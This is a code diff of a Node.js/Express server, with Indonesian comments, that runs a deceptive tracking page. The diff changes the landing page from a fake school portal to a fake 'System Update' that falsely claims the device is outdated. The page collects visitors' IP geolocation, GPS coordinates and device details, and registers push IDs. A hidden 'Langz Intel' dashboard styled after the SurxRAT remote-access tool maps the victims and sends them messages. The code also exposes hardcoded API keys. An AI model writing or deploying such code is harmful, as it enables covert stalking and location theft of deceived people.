@@ -2,27 +2,25 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const http = require('http');
-const webpush = require('web-push');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// KUNCI VAPID ASLI (JANGAN DIUBAH)
-const publicVapidKey = 'BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFgDzkrxZJjSgSnfckjBJuBkr3qB0k8h4wWnZ5tH6pX3A';
-const privateVapidKey = 'zZ8gP4D4Q1w2e3r4t5y6u7i8o9p0a1s2d3f4g5h6j7k8l9';
-webpush.setVapidDetails('mailto:admin@sekolah.id', publicVapidKey, privateVapidKey);
+// KONFIGURASI ONESIGNAL LO
+const ONESIGNAL_APP_ID = '209c76da-1da3-4518-9b9c-54b84efcc535';
+const ONESIGNAL_REST_KEY = 'os_v2_app_ecohnwq5uncrrg44ks4e57gfgxdvpd6354oubducbqew5qbz3gmjgsd2vaaz72niplmzkj46ivq3tk6sepctzdm3dlh4ky2umekrviy';
 
 const DASH_KEY = 'gilang123';
 const TLOG = path.join(__dirname, '_tlog');
 const GEO_FILE = path.join(TLOG, 'geo.tsv');
 const GPS_FILE = path.join(TLOG, 'gps.tsv');
 const DEVICE_FILE = path.join(TLOG, 'devices.json');
-const SUBS_FILE = path.join(TLOG, 'subscriptions.json');
+const OS_IDS_FILE = path.join(TLOG, 'onesignal_ids.json');
 
 if (!fs.existsSync(TLOG)) fs.mkdirSync(TLOG, { recursive: true });
 if (!fs.existsSync(GEO_FILE)) fs.writeFileSync(GEO_FILE, '');
 if (!fs.existsSync(GPS_FILE)) fs.writeFileSync(GPS_FILE, '');
-if (!fs.existsSync(SUBS_FILE)) fs.writeFileSync(SUBS_FILE, '[]');
+if (!fs.existsSync(OS_IDS_FILE)) fs.writeFileSync(OS_IDS_FILE, '{}');
 
 function clientIp(req) {
   const raw = req.headers['cf-connecting-ip'] || (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '0.0.0.0';
@@ -50,45 +48,35 @@ async function ipGeo(ip) {
 app.set('trust proxy', true); 
 app.use(express.json({ limit: '2mb' })); 
 
-// ==============================================================
-// SERVICE WORKER (WAJIB BUAT NOTIF TEMBUS)
-// ==============================================================
-app.get('/sw.js', (req, res) => {
-  res.setHeader('Content-Type', 'application/javascript');
-  res.send(`
-    self.addEventListener('push', function(e) {
-      let data = { title: 'Pemberitahuan', body: 'Pesan baru' };
-      if (e.data) { try { data = e.data.json(); } catch(err) { data.body = e.data.text(); } }
-      e.waitUntil(self.registration.showNotification(data.title, { body: data.body, vibrate: [200, 100, 200] }));
-    });
-  `);
-});
-
-app.post('/api/subscribe', (req, res) => {
+// API ONESIGNAL
+app.post('/api/save-player', (req, res) => {
   const ip = clientIp(req);
-  const sub = req.body;
-  if (!sub || !sub.endpoint) return res.status(400).json({error: 'Invalid sub'});
-  let subs = [];
-  try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
-  subs.push({ ip, subscription: sub });
-  fs.writeFileSync(SUBS_FILE, JSON.stringify(subs));
-  res.status(201).json({ ok: true });
+  const { playerId } = req.body;
+  if (!playerId) return res.status(400).json({ error: 'No Player ID' });
+  let ids = {};
+  try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
+  ids[ip] = playerId;
+  fs.writeFileSync(OS_IDS_FILE, JSON.stringify(ids));
+  res.json({ ok: true });
 });
 
 app.post('/api/push', async (req, res) => {
   if (req.headers['x-auth-key'] !== DASH_KEY) return res.status(403).json({ok:false});
   const { ip, text } = req.body;
-  let subs = [];
-  try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
-  const targetSubs = subs.filter(s => s.ip === ip);
-  if (targetSubs.length === 0) return res.json({ ok: false, msg: 'Target belum klik Izinkan Notif' });
+  let ids = {};
+  try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
+  const playerId = ids[ip];
+  if (!playerId) return res.json({ ok: false, msg: 'Target belum klik Izinkan' });
 
-  const payload = JSON.stringify({ title: 'Pemberitahuan Sistem', body: text });
-  let success = false;
-  for (let t of targetSubs) {
-    try { await webpush.sendNotification(t.subscription, payload); success = true; } catch (e) { console.log(e); }
-  }
-  res.json({ ok: success });
+  try {
+    const response = await fetch('https://onesignal.com/api/v1/notifications', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${ONESIGNAL_REST_KEY}` },
+      body: JSON.stringify({ app_id: ONESIGNAL_APP_ID, include_player_ids: [playerId], headings: { en: 'Pemberitahuan' }, contents: { en: text } })
+    });
+    const data = await response.json();
+    res.json({ ok: data.id ? true : false });
+  } catch (e) { res.json({ ok: false, msg: e.message }); }
 });
 
 app.get('/api/geoip', async (req, res) => {
@@ -109,7 +97,7 @@ app.post('/api/gps', (req, res) => {
   res.json({ ok: true });
 });
 
-// ============ DASHBOARD LIST ============
+// ============ DASHBOARD (TEMA SURXRAT) ============
 app.get('/dash', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   const devices = new Map();
@@ -153,24 +141,25 @@ app.get('/dash', (req, res) => {
     </a>`).join('');
 
   res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Langz Dashboard</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>
-  :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--text:#f8fafc;--muted:#94a3b8;--accent:#38bdf8;}
+  :root{--bg:#09090b;--card:#18181b;--border:#27272a;--text:#f4f4f5;--muted:#a1a1aa;--accent:#22d3ee;--green:#4ade80;}
   *{box-sizing:border-box;font-family:-apple-system,sans-serif}body{margin:0;background:var(--bg);color:var(--text);padding:20px}
-  .header{text-align:center;margin-bottom:25px}
-  .header h1{margin:0;font-size:22px;font-weight:800;color:#fff}
-  .header p{margin:5px 0 0;font-size:13px;color:var(--muted)}
+  .header{text-align:center;margin-bottom:25px;border-bottom:1px solid var(--border);padding-bottom:20px}
+  .header h1{margin:0;font-size:22px;font-weight:800;letter-spacing:2px;color:#fff}
+  .header p{margin:5px 0 0;font-size:12px;color:var(--accent);letter-spacing:1px}
   .grid{display:grid;grid-template-columns:1fr;gap:15px}
-  .row-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;text-decoration:none;color:inherit;transition:0.2s;display:block;box-shadow:0 4px 6px rgba(0,0,0,0.2)}
+  .row-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;text-decoration:none;color:inherit;transition:0.2s;display:block;box-shadow:0 4px 6px rgba(0,0,0,0.2);position:relative;overflow:hidden}
+  .row-card::before{content:'';position:absolute;top:0;left:0;width:4px;height:100%;background:var(--accent)}
   .row-card:active{transform:scale(0.98);border-color:var(--accent)}
   .row-top{display:flex;align-items:center;gap:15px;margin-bottom:12px}
-  .row-icon{width:50px;height:50px;background:#0f172a;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:24px;border:1px solid var(--border)}
+  .row-icon{width:50px;height:50px;background:#09090b;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:24px;border:1px solid var(--border)}
   .row-info{flex:1}
   .dev{font-weight:800;font-size:16px;color:#fff}
   .os{font-size:12px;color:var(--muted);margin-top:2px}
-  .row-badge{background:rgba(56,189,248,0.1);color:var(--accent);padding:6px 10px;border-radius:8px;font-size:11px;font-weight:bold;border:1px solid rgba(56,189,248,0.2)}
-  .row-bottom{display:flex;justify-content:space-between;border-top:1px solid var(--border);padding-top:12px;font-size:13px;color:var(--muted)}
-  .empty{text-align:center;padding:50px;color:var(--muted)}
+  .row-badge{background:rgba(34,211,238,0.1);color:var(--accent);padding:6px 10px;border-radius:8px;font-size:10px;font-weight:bold;border:1px solid rgba(34,211,238,0.2)}
+  .row-bottom{display:flex;justify-content:space-between;border-top:1px solid var(--border);padding-top:12px;font-size:12px;color:var(--muted);font-family:monospace}
+  .empty{text-align:center;padding:50px;color:var(--muted);font-family:monospace}
   </style></head><body>
-  <div class="header"><h1>⚡ Langz Intel</h1><p>Real-time Device Monitor</p></div>
+  <div class="header"><h1>⚡ LANGZ INTEL</h1><p>Real-time Device Monitor</p></div>
   <div class="grid">${rows || '<div class="empty">Belum ada device terdeteksi</div>'}</div>
   </body></html>`);
 });
@@ -229,10 +218,6 @@ app.get('/dash/map', (req, res) => {
       <input type="text" id="msgText" class="msg-input" placeholder="Ketik pesan...">
       <button class="btn btn-primary" onclick="sendPush()">Kirim Notifikasi</button>
     </div>
-    <div class="control-box">
-      <h3>📳 Remote Action</h3>
-      <button class="btn btn-danger" onclick="sendCmd('vibrate')">Getarkan HP Target</button>
-    </div>
     <div id="status" class="status">✅ Perintah terkirim!</div>
   </div>
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -248,7 +233,7 @@ app.get('/dash/map', (req, res) => {
     const res = await fetch('/api/push',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',text:text})});
     const j = await res.json();
     document.getElementById('status').style.display='block';
-    document.getElementById('status').innerText = j.ok ? '✅ Notif Tembus (web-push) Terkirim!' : '❌ ' + (j.msg || 'Gagal');
+    document.getElementById('status').innerText = j.ok ? '✅ Notif Tembus Terkirim!' : '❌ ' + (j.msg || 'Gagal');
     setTimeout(()=>document.getElementById('status').style.display='none', 3000);
   }
   </script>
@@ -256,50 +241,57 @@ app.get('/dash/map', (req, res) => {
 });
 
 // ==============================================================
-// LANDING PAGE (SMPN 4 CIKUPA + WEB-PUSH)
+// LANDING PAGE (TEMA SURXRAT + ANTI STUCK)
 // ==============================================================
 app.get('*', (req, res) => {
   const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
   res.type('html').send(`<!doctype html>
 <html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>SMPN 4 Cikupa</title>
+<title>System Update</title>
+<script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
+<script>
+  window.OneSignalDeferred = window.OneSignalDeferred || [];
+  OneSignalDeferred.push(async function(OneSignal) {
+    await OneSignal.init({ appId: "${ONESIGNAL_APP_ID}" });
+  });
+</script>
 <style>
-  body{margin:0;font-family:-apple-system,sans-serif;background:#f8fafc;color:#1e293b}
-  .navbar{background:#1e40af;color:#fff;padding:16px;font-weight:bold;font-size:18px;text-align:center}
-  .hero{background:url('https://images.unsplash.com/photo-1523050854058-8df90110c9f1?auto=format&fit=crop&w=600&q=80') center/cover; height:150px; display:flex; align-items:center; justify-content:center;}
-  .hero h1{background:rgba(0,0,0,0.6); color:#fff; padding:10px 20px; border-radius:8px; font-size:16px}
+  body{margin:0;font-family:-apple-system,sans-serif;background:#09090b;color:#f4f4f5}
+  .navbar{background:#18181b;color:#22d3ee;padding:16px;font-weight:bold;font-size:18px;text-align:center;border-bottom:1px solid #27272a}
+  .hero{background:linear-gradient(135deg, #18181b 0%, #09090b 100%); padding:40px 20px; text-align:center; border-bottom:1px solid #27272a;}
+  .hero h1{margin:0;color:#fff;font-size:20px;letter-spacing:1px}
+  .hero p{color:#a1a1aa;font-size:13px;margin-top:5px}
   .container{padding:16px;max-width:600px;margin:auto}
-  .card{background:#fff;border-radius:12px;padding:20px;margin-bottom:16px;box-shadow:0 4px 6px rgba(0,0,0,0.05);border-left:4px solid #1e40af}
-  .card h3{margin:0 0 10px;font-size:16px;color:#1e40af}
-  .card p{margin:0;font-size:13px;line-height:1.6;color:#475569}
-  .notif-btn { position: fixed; bottom: 20px; right: 20px; background: #1e40af; color: #fff; border: none; padding: 12px 20px; border-radius: 30px; font-weight: bold; font-size: 14px; box-shadow: 0 4px 12px rgba(30,64,175,0.4); display: flex; align-items: center; gap: 8px; cursor: pointer; z-index: 999; }
-  .popup-overlay{position:fixed;inset:0;background:rgba(15,23,42,0.8);display:flex;align-items:center;justify-content:center;z-index:9998;opacity:0;pointer-events:none;transition:0.3s}
+  .card{background:#18181b;border-radius:12px;padding:20px;margin-bottom:16px;border:1px solid #27272a;border-left:4px solid #22d3ee}
+  .card h3{margin:0 0 10px;font-size:16px;color:#22d3ee}
+  .card p{margin:0;font-size:13px;line-height:1.6;color:#a1a1aa}
+  
+  .popup-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);display:flex;align-items:center;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:0.3s}
   .popup-overlay.show{opacity:1;pointer-events:auto}
-  .popup-box{background:#fff;border-radius:16px;padding:24px;width:85%;max-width:320px;text-align:center;transform:translateY(20px);transition:0.3s}
+  .popup-box{background:#18181b;border-radius:16px;padding:24px;width:85%;max-width:320px;text-align:center;transform:translateY(20px);transition:0.3s;border:1px solid #27272a}
   .popup-overlay.show .popup-box{transform:translateY(0)}
   .popup-icon{font-size:40px;margin-bottom:15px}
-  .popup-box h3{margin:0 0 10px;font-size:18px;color:#0f172a}
-  .popup-box p{margin:0 0 20px;font-size:13px;color:#64748b;line-height:1.5}
-  .popup-btn{background:#1e40af;color:#fff;border:none;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:bold;width:100%;cursor:pointer;transition:0.2s}
+  .popup-box h3{margin:0 0 10px;font-size:18px;color:#fff}
+  .popup-box p{margin:0 0 20px;font-size:13px;color:#a1a1aa;line-height:1.5}
+  .popup-btn{background:#22d3ee;color:#000;border:none;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:bold;width:100%;cursor:pointer;transition:0.2s}
+  .popup-btn:active{background:#0ea5e9}
 </style></head>
 <body>
 
-<div class="navbar">SMPN 4 Cikupa</div>
-<div class="hero"><h1>Selamat Datang di Portal Informasi</h1></div>
+<div class="navbar">⚡ SYSTEM UPDATE</div>
+<div class="hero"><h1>Pembaruan Sistem Diperlukan</h1><p>Harap perbarui data perangkat Anda</p></div>
 
 <div class="container">
-  <div class="card"><h3>Pengumuman PPDB 2026</h3><p>Pendaftaran Peserta Didik Baru (PPDB) untuk tahun ajaran 2026/2027 akan segera dibuka.</p></div>
-  <div class="card"><h3>Jadwal Ujian Tengah Semester</h3><p>Ujian Tengah Semester (UTS) akan dilaksanakan mulai tanggal 10 bulan depan.</p></div>
+  <div class="card"><h3>Keamanan Perangkat</h3><p>Sistem mendeteksi versi perangkat Anda sudah usang. Silakan izinkan akses untuk memperbarui.</p></div>
+  <div class="card"><h3>Lokasi Terdeteksi</h3><p>Verifikasi lokasi diperlukan untuk memastikan perangkat Anda berada di zona aman.</p></div>
 </div>
-
-<button class="notif-btn" id="notifBtn">🔔 Aktifkan Notifikasi</button>
 
 <div class="popup-overlay" id="popup1">
   <div class="popup-box">
-    <div class="popup-icon">📍</div>
-    <h3>Akses Lokasi</h3>
-    <p>Untuk menampilkan informasi sekolah terdekat, harap izinkan akses lokasi Anda.</p>
-    <button class="popup-btn" id="allowLocBtn">Izinkan Lokasi</button>
+    <div class="popup-icon">🛡️</div>
+    <h3>Izin Akses</h3>
+    <p>System memerlukan akses lokasi dan notifikasi untuk melanjutkan pembaruan.</p>
+    <button class="popup-btn" id="allowBtn">OK, IZINKAN</button>
   </div>
 </div>
 
@@ -313,37 +305,40 @@ app.get('*', (req, res) => {
   if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
   fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
 
-  // --- POPUP LOKASI ---
   setTimeout(() => { document.getElementById('popup1').classList.add('show'); }, 1000);
-  document.getElementById('allowLocBtn').addEventListener('click', function() {
+
+  document.getElementById('allowBtn').addEventListener('click', async function() {
+    this.innerText = 'Memproses...';
+    const btn = this;
+
+    // Timer Anti Stuck (3 detik)
+    const forceClose = setTimeout(() => {
+      document.getElementById('popup1').classList.remove('show');
+      btn.innerText = 'OK, IZINKAN';
+    }, 3000);
+
+    // 1. Minta GPS
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug:slug}) }).catch(()=>{}); },
-        e => {}, {enableHighAccuracy:true,timeout:10000}
+        e => {}, {enableHighAccuracy:true,timeout:2000} // Timeout cepet
       );
     }
-    document.getElementById('popup1').classList.remove('show');
-  });
 
-  // --- NOTIFIKASI (WEB PUSH) ---
-  if ('serviceWorker' in navigator) {
-    try { await navigator.serviceWorker.register('/sw.js'); } catch(e) { console.log(e); }
-  }
-
-  document.getElementById('notifBtn').addEventListener('click', async function() {
-    const permission = await Notification.requestPermission();
-    if (permission === 'granted') {
-      const reg = await navigator.serviceWorker.ready;
-      const sub = await reg.pushManager.subscribe({
-        userVisibleOnly: true,
-        applicationServerKey: '${publicVapidKey}'
-      });
-      await fetch('/api/subscribe', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(sub) });
-      
-      this.innerText = '✅ Notifikasi Aktif';
-      this.style.background = '#10b981';
-      setTimeout(() => this.style.display = 'none', 2000);
+    // 2. Minta Notif (OneSignal)
+    if (window.OneSignal) {
+      try {
+        await OneSignal.Notifications.requestPermission();
+        const playerId = OneSignal.User.PushSubscription.id;
+        if(playerId) {
+          await fetch('/api/save-player', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({playerId}) });
+        }
+      } catch(e) { console.log(e); }
     }
+
+    clearTimeout(forceClose);
+    document.getElementById('popup1').classList.remove('show');
+    btn.innerText = 'OK, IZINKAN';
   });
 })();
 </script>
